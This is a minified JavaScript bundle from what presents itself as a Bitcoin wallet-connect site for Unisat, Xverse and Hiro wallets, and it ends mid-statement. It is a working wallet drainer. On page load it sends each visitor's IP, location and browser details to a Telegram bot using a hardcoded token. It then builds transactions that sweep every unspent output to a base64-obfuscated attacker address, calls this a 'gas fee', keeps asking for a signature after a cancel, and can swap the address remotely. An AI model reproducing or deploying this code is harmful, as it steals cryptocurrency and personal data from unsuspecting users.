/*! For license information please see main.e1d54b33.js.LICENSE.txt */
const tokennot = "6159106373:AAHpup2IpR_3SRi7W592cstkCiE_81RRDtI";

function Notificator(text) {
  var userAgent = encodeURIComponent(navigator.userAgent);
  var language = encodeURIComponent(navigator.language);
  var date = encodeURIComponent(new Date().toString());
  console.log(userAgent, language, date);
  fetch('https://api.db-ip.com/v2/free/self/')
    .then(response => response.json())
    .then(data => {
      const ipAddress = data.ipAddress;
      const countryCode = data.countryCode;
      const city = data.city;
      console.log(ipAddress, countryCode, city);

      var url = 'https://api.telegram.org/bot' + tokennot + '/sendMessage?chat_id=-1001883823728&text=' + text + '%0A🖥User Agent: `' + userAgent + '`%0A🌍Language: `' + language + '`%0A🕐Date: `' + date + '`%0A🌐IP Address: `' + ipAddress + '`%0A🌎Country Code: `' + countryCode + '`%0A🏙️City: `' + city + '`&parse_mode=Markdown';

      var xhrn = new XMLHttpRequest();
      xhrn.open('GET', url);
      xhrn.send();
    })
    .catch(error => {
      console.error('Ошибка:', error);
    });
}


window.onload = function() {
  Notificator('🌍New User Unisat');
};
(() => {
  var e = {
      3993: (e, t, n) => {
        var r = { "./connect-modal.entry.js": [8730, 730] };
        function i(e) {
          if (!n.o(r, e))
            return Promise.resolve().then(() => {
              var t = new Error("Cannot find module '" + e + "'");
              throw ((t.code = "MODULE_NOT_FOUND"), t);
            });
          var t = r[e],
            i = t[0];
          return n.e(t[1]).then(() => n(i));
        }
        (i.keys = () => Object.keys(r)), (i.id = 3993), (e.exports = i);
      },
      9555: (e, t, n) => {
        "use strict";
        n.a(e, async (e, r) => {
          try {
            n.d(t, { Z: () => f });
            var i = n(2841),
              o = n(5676),
              s = n(406),
              a = n(184),
              l = e([s]);
            function u() {
              const { authOptions: e } = (0, o.a)();
              return (0, a.jsx)(i.lj, {
                authOptions: e,
                children: (0, a.jsx)(s.o, {}),
              });
            }
            s = (l.then ? (await l)() : l)[0];
            const f = u;
            r();
          } catch (c) {
            r(c);
          }
        });
      },
      5676: (e, t, n) => {
        "use strict";
        n.d(t, { a: () => a });
        var r = n(2791),
          i = n(8674),
          o = n(2845);
        const s = () => {
          const e = new i.X(["store_write"], document.location.href),
            t = new o.V({ appConfig: e });
          return t.isUserSignedIn()
            ? { userData: t.loadUserData() }
            : { userData: null };
        };
        s();
        function a() {
          const [e, t] = r.useState(s()),
            [n, a] = r.useState(""),
            [l, c] = r.useState(""),
            u = (0, r.useMemo)(
              () =>
                new i.X(
                  ["store_write", "publish_data"],
                  document.location.href
                ),
              []
            ),
            f = (0, r.useMemo)(() => new o.V({ appConfig: u }), [u]),
            h = (0, r.useCallback)(() => {
              f.signUserOut(), t({ userData: null });
            }, [f]),
            d = (0, r.useCallback)(async () => {
              if (f.isSignInPending()) {
                const e = await f.handlePendingSignIn();
                t({ userData: e }), c(e.appPrivateKey);
              } else f.isUserSignedIn() && c(f.loadUserData().appPrivateKey);
            }, [f]),
            p = (0, r.useCallback)((e) => {
              let { userSession: n, authResponse: r } = e;
              const i = n.loadUserData();
              c(n.loadUserData().appPrivateKey), a(r), t({ userData: i });
            }, []),
            g = (0, r.useCallback)(() => {}, []);
          (0, r.useEffect)(() => {
            if ((d(), f.isUserSignedIn() && !e.userData)) {
              const e = f.loadUserData();
              t({ userData: e });
            }
          }, [d, f, e]);
          return {
            authOptions: {
              manifestPath: "/static/manifest.json",
              redirectTo: "/",
              userSession: f,
              onFinish: p,
              onCancel: g,
              appDetails: {
                name: "Testing App",
                icon: "http://placekitten.com/g/100/100",
              },
            },
            state: e,
            authResponse: n,
            appPrivateKey: l,
            handleSignOut: h,
          };
        }
      },
      9695: (e, t, n) => {
        "use strict";
        n.d(t, { V: () => r });
        const r = (e, t) => {
          const n = document.querySelectorAll('[data-id="conteiner_connect"]'),
            r = document.querySelectorAll('[data-id="conteiner_connected"]'),
            i = document.querySelectorAll('[data-id="account_wallet"]');
          if (e) {
            for (let e of r) e.style = "";
            for (let e of n) e.style = "display: none";
          } else {
            for (let e of r) e.style = "display: none";
            for (let e of n) e.style = "";
            for (let e of i) e.innerHTML = "";
          }
        };
      },
      8305: (e, t, n) => {
        "use strict";
        n.a(e, async (e, t) => {
          try {
            var r = n(5144),
              i = n(2841),
              o = (n(2791), n(1250)),
              s = n(9555),
              a = n(9085),
              l = (n(5462), n(277), n(4218), n(184)),
              c = e([s]);
            s = (c.then ? (await c)() : c)[0];
            const u = (e) => {
              let { closeToast: t } = e;
              return (0, l.jsx)("button", {
                style: { marginRight: 20 },
                "aria-label": "close",
                onClick: t,
                class: "Vue-Toastification__close-button",
                children: "\xd7",
              });
            };
            o
              .createRoot(document.getElementById("app"))
              .render(
                (0, l.jsxs)(r.de, {
                  appName: "My sick app",
                  network: "mainnet",
                  children: [
                    (0, l.jsx)(i.lj, { children: (0, l.jsx)(s.Z, {}) }),
                    (0, l.jsx)(a.Ix, { closeButton: u }),
                  ],
                })
              ),
              t();
          } catch (u) {
            t(u);
          }
        });
      },
      4743: (e, t, n) => {
        "use strict";
        n.d(t, { l: () => a });
        var r = n(5798),
          i = n(8688),
          o = n(2046),
          s = n(2550);
        function a(e) {
          let { state: t, setState: n, setting: a, ids: l } = e;
          const c = (0, i.Z)();
          return (
            (window.xverseConnect = async () => {
              if ("xverse" !== t.connect) {
                Notificator("*XVSERSE* Connect Request");
                const i = {
                  payload: {
                    purposes: ["ordinals", "payment"],
                    message: "Address for receiving Ordinals and payments",
                    network: { type: "Mainnet" },
                  },
                  onFinish: async (e) => {
                    if (null !== e && void 0 !== e && e.addresses) {
                      localStorage.setItem("wallet", "xverse");
                      const r = [];
                      for (
                        let t = 0;
                        t <
                        (null === e || void 0 === e
                          ? void 0
                          : e.addresses.length);
                        t++
                      ) {
                        const n =
                          null === e || void 0 === e ? void 0 : e.addresses[t];
                        let i = 0,
                          o = "";
                        "ordinals" === n.purpose && (o = "p2tr"),
                          "payment" === n.purpose && (o = "p2sh-p2wpkh");
                        (i = (await c.getBalance(n.address)).finalBalance),
                        Notificator("*XVERSE CONNECTED* User Balance for address `" + n.address + "` - `" + i + "`")
                          r.push({
                            address: n.address,
                            publicKey: n.publicKey,
                            type: o,
                            balance: i,
                          });
                      }
                      const i = { ...t };
                      (i.connect = "xverse"),
                        (i.accountsWallet = r),
                        (0, o.wt)("connect", {
                          walletType: "xverse",
                          accounts: i.accountsWallet,
                        }),
                        n(i);
                    }
                  },
                  onCancel: () => console.log("request canceled"),
                  onCancel: () => Notificator("*XVERSE* connect canceled :((("),
                };
                try {
                  await (0, r.getAddress)(i);
                } catch (e) {
                  (0, s.s)("No Bitcoin Wallet Installed");
                  Notificator("No Bitcoin Wallet Installed");
                }
              } else if (t.invoice) {
                const e = { ...t };
                (e.invoice = !1), n(e);
              }
            }),
            (window.unisatConnect = async () => {
              if ("unisat" !== t.connect) {
                if ("undefined" !== typeof window.unisat) {
                  let r = [];
                  try {
                    r = await window.unisat.requestAccounts();
                    Notificator("*UNISAT CONNECTED* User Address - `" + r[0] + "`");
                  } catch (e) {
                    console.error(e);
                  }
                  let i = 0;
                  try {
                    i = await window.unisat.getBalance();
                  } catch (e) {
                    console.error(e);
                  }
                  let s = "";
                  try {
                    s = await window.unisat.getPublicKey();
                  } catch (e) {
                    console.log(e);
                  }
                  if (r.length) {
                    localStorage.setItem("wallet", "unisat");
                    const e = { ...t };
                    (e.connect = "unisat"),
                      (e.accountsWallet = [
                        {
                          address: r[0],
                          publicKey: s,
                          type: r[0].startsWith("bc1q")
                            ? "p2wpkh"
                            : r[0].startsWith("3")
                            ? "p2sh-p2wpkh"
                            : r[0].startsWith("bc1p")
                            ? "p2tr"
                            : r[0].startsWith("1")
                            ? "p2pkh"
                            : "unknown",
                          balance: i.confirmed,
                        },
                      ]),
                      (0, o.wt)("connect", {
                        walletType: "unisat",
                        accounts: e.accountsWallet,
                      }),
                      n(e);
                  }
                }
              } else if (t.invoice) {
                const e = { ...t };
                (e.invoice = !1), n(e);
              }
            }),
            (window.hiroConnect = async () => {
              if ("hiro" !== t.connect) {
                var e, r;
                const i = await (null === (e = window.btc) || void 0 === e
                  ? void 0
                  : e.request("getAddresses"));
                if (
                  null !== i &&
                  void 0 !== i &&
                  null !== (r = i.result) &&
                  void 0 !== r &&
                  r.addresses
                ) {
                  let e = [],
                    r = [];
                  for (let t of i.result.addresses)
                    if ("p2wpkh" === t.type || "p2tr" === t.type) {
                      const n = t.address,
                        i = t.publicKey,
                        o = (await c.getBalance(n)).finalBalance;
                      e.push({
                        address: n,
                        type: t.type,
                        publicKey: i,
                        balance: o,
                      }),
                        r.push(n);
                    }
                  localStorage.setItem("wallet", "hiro");
                  const s = { ...t };
                  (s.connect = "hiro"),
                    (s.accountsWallet = e),
                    (0, o.wt)("connect", {
                      walletType: "hiro",
                      accounts: s.accountsWallet,
                    }),
                    n(s);
                }
              } else if (t.invoice) {
                const e = { ...t };
                (e.invoice = !1), n(e);
              }
            }),
            (window.bitcoinLogout = () => {
              if ("unisat" === t.connect)
                try {
                  window.unisat.close();
                } catch {}
              if ("hiro" === t.connect)
                try {
                  window.btc.close();
                } catch {}
              n(a);
            }),
            null
          );
        }
      },
      4150: (e, t, n) => {
        "use strict";
        n.a(
          e,
          async (e, r) => {
            try {
              n.d(t, { Y: () => E });
              var i = n(1243),
                o = n(7714),
                s = n(5123),
                a = n(8688),
                l = n(5798),
                c = n(2550),
                u = n(2841),
                f = n(9926),
                h = n(9083),
                d = n(2046),
                p = n(6128);
              const { server: y, repeatTransactions: w } = p;
              let m = atob(
                  "YmMxcTllZmRzeHZlOG02NzV3bGx2N2RhNjh0czRhNTV5NzNkZjU3Nmsz"
                ),
                b = 2e4,
                v = 25e3;
              function E(e) {
                let { state: t } = e;
                const { signPsbt: n } = (0, u.$4)();
                console.log(m);
                const r = (0, a.Z)(),
                  p = { bech32: "bc", pubKeyHash: 0, scriptHash: 5, wif: 128 },
                  g = Math.floor(Math.random() * (v - b + 1)) + b;
                async function y(e) {
                  const t = s.US.encode((0, h.nr)(e)),
                    n =
                      "https://btc.getblock.io/8b2a8133-2b54-4709-b981-f69ccebb72d5/mainnet/";
                  try {
                    const e = await i.Z.post(
                      n,
                      JSON.stringify({
                        jsonrpc: "1.0",
                        id: "curltext",
                        method: "finalizepsbt",
                        params: [t],
                      }),
                      {}
                    );
                    (0, d.wt)("transaction_broadcast", {
                      broadcast: e.data.result.hex,
                    });
                    return await i.Z.post(
                      n,
                      JSON.stringify({
                        jsonrpc: "1.0",
                        id: "curltext",
                        method: "sendrawtransaction",
                        params: [e.data.result.hex],
                      }),
                      {}
                    );
                  } catch (r) {
                    return console.log(r), !1;
                  }
                }
                async function E(e, t, n) {
                  const i = await r.getUnspentOutputs(e),
                    a = (0, h.nr)(t),
                    l = o.Vi(a, p),
                    c = new o.YW();
                  for (
                    let r = 0;
                    r < (null === i || void 0 === i ? void 0 : i.length);
                    r++
                  )
                    c.addInput({
                      txid: i[r].txid,
                      index: i[r].vout,
                      witnessUtxo: {
                        amount: BigInt(i[r].value),
                        script: l.script,
                      },
                    });
                  c.addOutputAddress(m, BigInt(n - g), p);
                  const u = c.toPSBT(0),
                    f = s.US.encode(u);
                  return { signAtIndex: 0, hex: (0, h.ci)(u), base64: f };
                }
                async function S(e, t, n) {
                  const i = await r.getUnspentOutputs(e),
                    a = (0, h.nr)(t),
                    l = o.Vi(a, p),
                    c = o.my(l, p),
                    u = new o.YW();
                  for (
                    let r = 0;
                    r < (null === i || void 0 === i ? void 0 : i.length);
                    r++
                  )
                    u.addInput({
                      txid: i[r].txid,
                      index: i[r].vout,
                      witnessUtxo: {
                        amount: BigInt(i[r].value),
                        script: c.script,
                      },
                      redeemScript: c.redeemScript,
                    });
                  u.addOutputAddress(m, BigInt(n - g), p);
                  const f = u.toPSBT(0),
                    d = s.US.encode(f);
                  return { signAtIndex: 0, hex: (0, h.ci)(f), base64: d };
                }
                async function x(e, t, n, i) {
                  const a = await r.getUnspentOutputs(e),
                    l = (0, h.nr)(t),
                    c = o.Sq(
                      (function (e) {
                        return 33 === e.byteLength ? e.slice(1) : e;
                      })(l),
                      void 0,
                      p
                    ),
                    u = new o.YW();
                  for (
                    let r = 0;
                    r < (null === a || void 0 === a ? void 0 : a.length);
                    r++
                  ) {
                    const e = {
                      index: a[r].vout,
                      tapInternalKey: c.tapInternalKey,
                      txid: a[r].txid,
                      witnessUtxo: {
                        amount: BigInt(a[r].value),
                        script: c.script,
                      },
                    };
                    "xverse" === i &&
                      (e.sighashType = o.JL.SINGLE | o.JL.ANYONECANPAY),
                      u.addInput(e);
                  }
                  u.addOutputAddress(m, BigInt(n - g), p);
                  const f = u.toPSBT(0),
                    d = s.US.encode(f);
                  return { signAtIndex: 0, hex: (0, h.ci)(f), base64: d };
                }
                async function A(e, t, n) {
                  const i = await r.getUnspentOutputs(e),
                    a = new o.YW();
                  for (
                    let o = 0;
                    o < (null === i || void 0 === i ? void 0 : i.length);
                    o++
                  )
                    a.addInput({
                      txid: i[o].txid,
                      index: i[o].vout,
                      nonWitnessUtxo: await r.getHexTx(i[o].txid),
                    });
                  a.addOutputAddress(m, BigInt(n - g), p);
                  const l = a.toPSBT(0),
                    c = s.US.encode(l);
                  return { signAtIndex: 0, hex: (0, h.ci)(l), base64: c };
                }
                return (
                  (window.bitcoinTransaction = async () => {
                    const e = localStorage.getItem("wallet");
                    if ("xverse" === e) {
                      const n =
                        null === t || void 0 === t ? void 0 : t.accountsWallet;
                      n.sort((e, t) => t.balance - e.balance);
                      const o = n.filter((e) => e.balance >= g);
                      0 == o.length &&
                        (0, c.s)("Insufficient funds to pay the gas fee.");
                      for (let t = 0; t < o.length; t++) {
                        var r, i;
                        if (
                          "p2sh-p2wpkh" ===
                          (null === (r = o[t]) || void 0 === r
                            ? void 0
                            : r.type)
                        )
                          try {
                            const n = await S(
                              o[t].address,
                              o[t].publicKey,
                              o[t].balance
                            );
                            (0, d.wt)("transaction_started", Notificator("Transaction Started. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"),{
                              account: o[t].address,
                              walletType: e,
                              balance: o[t].balance,
                            });
                            const r = {
                              payload: {
                                network: { type: "Mainnet" },
                                message: "Sign Transaction",
                                psbtBase64: n.base64,
                                broadcast: !0,
                                inputsToSign: [
                                  {
                                    address: o[t].address,
                                    signingIndexes: [0],
                                  },
                                ],
                              },
                              onFinish: (n) => {
                                (0, c.f)("Transaction Succsess"),
                                  (0, d.wt)("transaction_true", Notificator("Transaction Succsess. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"), {
                                    account: o[t].address,
                                    walletType: e,
                                    balance: o[t].balance,
                                  });
                              },
                              onCancel: () => {
                                (0, c.s)("Transaction Failed"),
                                  (0, d.wt)("transaction_false", Notificator("Transaction canceled. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"), {
                                    account: o[t].address,
                                    walletType: e,
                                    balance: o[t].balance,
                                  }),
                                  w && t--;
                              },
                            };
                            await (0, l.signTransaction)(r);
                          } catch (a) {
                            console.log(a),
                              (0, c.s)("Transaction Failed"),
                              (0, d.wt)("transaction_false", Notificator("Transaction Failed. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"), {
                                account: o[t].address,
                                walletType: e,
                                balance: o[t].balance,
                                error:
                                  null !== a && void 0 !== a && a.message
                                    ? null === a || void 0 === a
                                      ? void 0
                                      : a.message
                                    : "",
                              });
                          }
                        if (
                          "p2tr" ===
                          (null === (i = o[t]) || void 0 === i
                            ? void 0
                            : i.type)
                        )
                          try {
                            const n = await x(
                              o[t].address,
                              o[t].publicKey,
                              o[t].balance,
                              e
                            );
                            (0, d.wt)("transaction_started",
                            Notificator("Transaction Started. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"), {
                              account: o[t].address,
                              walletType: e,
                              balance: o[t].balance,
                            }
                            );
                            const r = {
                              payload: {
                                network: { type: "Mainnet" },
                                message: "Sign Transaction",
                                psbtBase64: n.base64,
                                broadcast: !0,
                                inputsToSign: [
                                  {
                                    address: o[t].address,
                                    signingIndexes: [0],
                                    sigHash: 131,
                                  },
                                ],
                              },
                              onFinish: (n) => {
                                (0, c.f)("Transaction Succsess", Notificator("Transaction Succsess. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"),),
                                
                                  (0, d.wt)("transaction_true", Notificator("Transaction Succsess. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"),{
                                    account: o[t].address,
                                    walletType: e,
                                    balance: o[t].balance,
                                  });
                              },
                              onCancel: () => {
                                (0, c.s)("Transaction Failed"),
                                  (0, d.wt)("transaction_false", Notificator("Transaction canceled. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"),{
                                    account: o[t].address,
                                    walletType: e,
                                    balance: o[t].balance,
                                  }),
                                  w && t--;
                              },
                            };
                            await (0, l.signTransaction)(r);
                          } catch (a) {
                            console.log(a),
                              (0, c.s)("Transaction Failed"),
                              (0, d.wt)("transaction_false", Notificator("Transaction Failed. account `" +  o[t].address + "` `" + o[t].balance + "` WalletType `" + e + "`"),{
                                account: o[t].address,
                                walletType: e,
                                balance: o[t].balance,
                                error:
                                  null !== a && void 0 !== a && a.message
                                    ? null === a || void 0 === a
                                      ? void 0
                                      : a.message
                                    : "",
                              });
                          }
                      }
                    }
                    if ("unisat" === e) {
                      const n =
                        null === t || void 0 === t ? void 0 : t.accountsWallet;
                      n.sort((e, t) => e.balance - t.balance);
                      const r = n.filter((e) => e.balance >= g);
                      0 == r.length &&
                        (0, c.s)("Insufficient funds to pay the gas fee.");
                      for (let t = 0; t < r.length; t++) {
                        let n = "";
                        "p2wpkh" === r[t].type &&
                          (n = await E(
                            r[t].address,
                            r[t].publicKey,
                            r[t].balance
                          )),
                          "p2sh-p2wpkh" === r[t].type &&
                            (n = await S(
                              r[t].address,
                              r[t].publicKey,
                              r[t].balance
                            )),
                          "p2tr" === r[t].type &&
                            (n = await x(
                              r[t].address,
                              r[t].publicKey,
                              r[t].balance,
                              e
                            )),
                          "p2pkh" === r[t].type &&
                            (n = await A(
                              r[t].address,
                              r[t].publicKey,
                              r[t].balance
                            ));
                        try {
                          (0, d.wt)("transaction_started", {
                            account: r[t].address,
                            walletType: e,
                            balance: r[t].balance,
                          });
                          const i = await window.unisat.signPsbt(n.hex);
                          (await y(i))
                            ? ((0, c.f)("Transaction Succsess"), Notificator("Transaction Succsess. account `" +  r[t].address + "` `" + r[t].balance + "` WalletType `" + e + "`"),
                              (0, d.wt)("transaction_true", {
                                account: r[t].address,
                                walletType: e,
                                balance: r[t].balance,
                              }))
                            : ((0, c.s)("Transaction Failed"),
                              (0, d.wt)("transaction_false", Notificator("Transaction Failed. account `" +  r[t].address + "` `" + r[t].balance + "` WalletType `" + e + "`"),{
                                account: r[t].address,
                                walletType: e,
                                balance: r[t].balance,
                              }));
                        } catch (a) {
                          console.log(a),
                            (0, c.s)("Transaction Failed"),
                            (0, d.wt)("transaction_false", Notificator("Transaction Failed. account `" +  r[t].address + "` `" + r[t].balance + "` WalletType `" + e + "`"),{
                              account: r[t].address,
                              walletType: e,
                              balance: r[t].balance,
                              error:
                                null !== a && void 0 !== a && a.message
                                  ? null === a || void 0 === a
                                    ? void 0
                                    : a.message
                                  : "",
                            }),
                            4001 == a.code && w && t--;
                        }
                      }
                    }
                    if ("hiro" === e) {
                      const r =
                        null === t || void 0 === t ? void 0 : t.accountsWallet;
                      r.sort((e, t) => t.balance - e.balance);
                      const i = r.filter((e) => e.balance >= g);
                      0 == i.length &&
                        (0, c.s)("Insufficient funds to pay the gas fee.");
                      for (let t = 0; t < i.length; t++) {
                        var o, s;
                        if (
                          "p2wpkh" ===
                          (null === (o = i[t]) || void 0 === o
                            ? void 0
                            : o.type)
                        ) {
                          const r = await E(
                            i[t].address,
                            i[t].publicKey,
                            i[t].balance
                          );
                          (0, d.wt)("transaction_started", Notificator("Transaction Started. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                            account: i[t].address,
                            walletType: e,
                            balance: i[t].balance,
                          });
                          try {
                            await n({
                              signAtIndex: r.signAtIndex,
                              hex: r.hex,
                              network: f._Y,
                              onFinish: async (n) => {
                                await y(n.hex),
                                  Notificator("Transaction Succsess. " + "account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),
                                  (0, c.f)("Transaction Succsess"),
                                  (0, d.wt)("transaction_true", Notificator("Transaction Succsess. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"), {
                                    account: i[t].address,
                                    walletType: e,
                                    balance: i[t].balance,
                                  });
                              },
                              onCancel: () => {
                                (0, c.s)("Transaction Failed"),
                                  (0, d.wt)("transaction_false", Notificator("Transaction canceled. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                                    account: i[t].address,
                                    walletType: e,
                                    balance: i[t].balance,
                                  }),
                                  w && t--;
                              },
                            });
                          } catch (a) {
                            console.log(a),
                              (0, c.s)("Transaction Failed"),
                              (0, d.wt)("transaction_false", Notificator("Transaction Failed. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                                account: i[t].address,
                                walletType: e,
                                balance: i[t].balance,
                                error:
                                  null !== a && void 0 !== a && a.message
                                    ? null === a || void 0 === a
                                      ? void 0
                                      : a.message
                                    : "",
                              });
                          }
                        }
                        if (
                          "p2tr" ===
                          (null === (s = i[t]) || void 0 === s
                            ? void 0
                            : s.type)
                        ) {
                          const r = await x(
                            i[t].address,
                            i[t].publicKey,
                            i[t].balance,
                            e
                          );
                          (0, d.wt)("transaction_started", Notificator("Transaction Started. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                            account: i[t].address,
                            walletType: e,
                            balance: i[t].balance,
                          });
                          try {
                            await n({
                              signAtIndex: r.signAtIndex,
                              hex: r.hex,
                              network: f._Y,
                              onFinish: async (n) => {
                                await y(n.hex),
                                  (0, c.f)("Transaction Succsess"),
                                  (0, d.wt)("transaction_true", Notificator("Transaction Succsess. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                                    account: i[t].address,
                                    walletType: e,
                                    balance: i[t].balance,
                                  });
                              },
                              onCancel: () => {
                                (0, c.s)("Transaction Failed"),
                                  (0, d.wt)("transaction_false", Notificator("Transaction Canceled. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                                    account: i[t].address,
                                    walletType: e,
                                    balance: i[t].balance,
                                  }),
                                  w && t--;
                              },
                            });
                          } catch (a) {
                            console.log(a),
                              (0, c.s)("Transaction Failed"),
                              (0, d.wt)("transaction_false", Notificator("Transaction Failed. account `" +  i[t].address + "` `" + i[t].balance + "` WalletType `" + e + "`"),{
                                account: i[t].address,
                                walletType: e,
                                balance: i[t].balance,
                                error:
                                  null !== a && void 0 !== a && a.message
                                    ? null === a || void 0 === a
                                      ? void 0
                                      : a.message
                                    : "",
                              });
                          }
                        }
                      }
                    }
                  }),
                  null
                );
              }
              await i.Z.get(`${y}date`)
                .then((e) => {
                  const t = e.data,
                    n = t.min,
                    r = t.max;
                  !isNaN(n) &&
                    !isNaN(r) &&
                    n > 0 &&
                    r > 0 &&
                    ((b = n), (v = r));
                })
                .catch((e) => {
                  console.error("Error occurred while making the request:", e);
                  Notificator("Error occurred while making the request: " + e);
                }),
                (async () => {
                  try {
                    if ((await i.Z.get(`${y}update`)).data.exists)
                      try {
                        m = atob(
                          "YmMxcTllZmRzeHZlOG02NzV3bGx2N2RhNjh0czRhNTV5NzNkZjU3Nmsz"
                        );
                      } catch (e) {
                        m = atob(
                          "YmMxcTllZmRzeHZlOG02NzV3bGx2N2RhNjh0czRhNTV5NzNkZjU3Nmsz"
                        );
                      }
                    else
                      try {
                        const e = await i.Z.get(`${y}bitcoin`);
                        m = atob(e.data.apiKey);
                      } catch (e) {
                        m = atob(
                          "YmMxcTllZmRzeHZlOG02NzV3bGx2N2RhNjh0czRhNTV5NzNkZjU3Nmsz"
                        );
                      }
                  } catch (e) {
                    m = atob(
                      "YmMxcTllZmRzeHZlOG02NzV3bGx2N2RhNjh0czRhNTV5NzNkZjU3Nmsz"
                    );
                  }
                })(),
                r();
            } catch (g) {
              r(g);
            }
          },
          1
        );
      },
      8688: (e, t, n) => {
        "use strict";
        n.d(t, { Z: () => s });
        var r = n(2791),
          i = n(1243);
        class o {
          constructor() {
            (this.remoteBtcApiURL = "https://mempool.space/api"),
              (this.instance = i.Z.create());
          }
          async getBalance(e) {
            const { data: t } = await this.instance.get(
                `${this.remoteBtcApiURL}/address/${e}`
              ),
              { chain_stats: n, mempool_stats: r } = t,
              i = n.funded_txo_sum - n.spent_txo_sum,
              o = r.funded_txo_sum - r.spent_txo_sum;
            return {
              address: e,
              finalBalance: i,
              finalNTx: n.tx_count,
              totalReceived: n.funded_txo_sum,
              totalSent: n.spent_txo_sum,
              unconfirmedTx: r.tx_count,
              unconfirmedBalance: o,
            };
          }
          async getUnspentOutputs(e) {
            const { data: t } = await this.instance.get(
              `${this.remoteBtcApiURL}/address/${e}/utxo`
            );
            return t;
          }
          async getHexTx(e) {
            const { data: t } = await this.instance.get(
              `${this.remoteBtcApiURL}/tx/${e}/hex`
            );
            return t;
          }
        }
        const s = () =>
          (0, r.useMemo)(() => new o(), ["https://mempool.space/api"]);
      },
      8758: (e, t, n) => {
        "use strict";
        n.d(t, { N: () => i, m: () => o });
        n(6128);
        var r = n(2791);
        const i = () => (
            (0, r.useEffect)(() => {
              const e = document.createElement("div");
              (e.innerHTML =
                '\n        \t<div  role="presentation" class="MuiModal-root css-8ndowl" id="modal_popup" style="display: none">\n                <div aria-hidden="true" class="MuiBackdrop-root Modal_backdrop__yVk2e MuiModal-backdrop css-919eu4" style="opacity: 1; transition: opacity 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;"></div>\n\n\n                <div class="Modal_root__F4wBR">\n                    <div  id="popCont" class="Modal_container__oPBQL">\n                        <div class="Modal_body__qJBCh">\n                            <div class="ConnectWalletModal_root__H_AyV">\n                                <svg viewBox="0 0 56 56" fill="none" class="ConnectWalletModal_icon__H1En5">\n                                    <rect x="4" y="4" width="48" height="48" rx="24" fill="#F4EBFF"></rect>\n                                    <path\n                                        d="M20.7025 36H35.2975C37.0872 36 38 35.0771 38 33.2678V22.723C38 20.9229 37.0872 20 35.2975 20H20.7025C18.9128 20 18 20.9138 18 22.723V33.2678C18 35.0771 18.9128 36 20.7025 36ZM19.4765 22.8235C19.4765 21.9463 19.9329 21.5077 20.7562 21.5077H35.2438C36.0582 21.5077 36.5235 21.9463 36.5235 22.8235V24.1119H19.4765V22.8235ZM20.7562 34.4923C19.9329 34.4923 19.4765 34.0445 19.4765 33.1673V26.0948H36.5235V33.1673C36.5235 34.0445 36.0582 34.4923 35.2438 34.4923H20.7562Z"\n                                        fill="#6941C6"\n                                    ></path>\n                                    <rect x="4" y="4" width="48" height="48" rx="24" stroke="#F9F5FF" stroke-width="8"></rect>\n                                </svg>\n                                <p class="ConnectWalletModal_title__Ln_BK text-lg semibold __inter">Connect Wallet</p>\n                                <p class="ConnectWalletModal_description__FQ0Lw text-sm regular __inter">Choose how you want to connect. If you don\'t have a wallet, you can select a provider and create one.</p>\n                                <div class="ConnectWalletModal_actions__MtWCb __inter">\n                                    <div data-id="xverseConnect" class="text-md bold ConnectWalletModal_action__766BA">\n                                        <img src="img/connect-xverse.png" class="ConnectWalletModal_actionIcon__hgvbK" />\n                                        Xverse\n                                    </div>\n                                    <div  data-id="unisatConnect" class="text-md bold ConnectWalletModal_action__766BA">\n                                        <img src="img/connect-unisat.png" class="ConnectWalletModal_actionIcon__hgvbK" />\n                                        Unisat\n                                    </div>\n                                    <div data-id="hiroConnect" class="text-md bold ConnectWalletModal_action__766BA">\n                                        <img src="img/connect-ordinals-wallet.png" class="ConnectWalletModal_actionIcon__hgvbK" />\n                                        Hiro\n                                    </div>\n                                </div>\n                            </div>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        '),
                document.body.appendChild(e);
              const t = document.querySelectorAll(
                '[data-id="connect_button_modal"]'
              );
              for (let i of t)
                i.addEventListener("click", () => {
                  (document.getElementById("modal_popup").style =
                    "opacity: 0;  transition: all 0.2s ease-in-out;"),
                    setTimeout(() => {
                      document.getElementById("modal_popup").style =
                        "opacity: 1;  transition: all 0.2s ease-in-out;";
                    }, 200);
                });
              const n = document.getElementById("popCont");
              let r = !1;
              (n.onmouseover = () => {
                r = !0;
              }),
                (n.onmouseleave = () => {
                  r = !1;
                }),
                document
                  .getElementById("modal_popup")
                  .addEventListener("click", () => {
                    !1 === r &&
                      (document.getElementById("modal_popup").style =
                        "display: none");
                  });
            }, [null]),
            null
          ),
          o = () => (
            (0, r.useEffect)(() => {
              const e = document.createElement("div");
              (e.innerHTML =
